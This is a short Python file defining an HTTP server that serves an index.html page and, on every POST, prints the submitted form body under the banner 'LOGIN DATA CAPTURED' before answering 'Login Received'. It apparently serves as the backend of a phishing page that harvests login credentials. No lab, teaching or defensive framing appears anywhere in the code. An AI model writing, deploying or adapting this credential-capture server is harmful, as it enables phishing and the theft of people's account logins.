from http.server import HTTPServer, BaseHTTPRequestHandler

class MyHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        print("\n🔥 LOGIN DATA CAPTURED:")
        print(post_data.decode())

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

        self.wfile.write(b"""
        <h2>Login Received</h2>
        <p>Done</p>
        """)

server = HTTPServer(("0.0.0.0", 8000), MyHandler)

print("Server running on port 8000...")
server.serve_forever()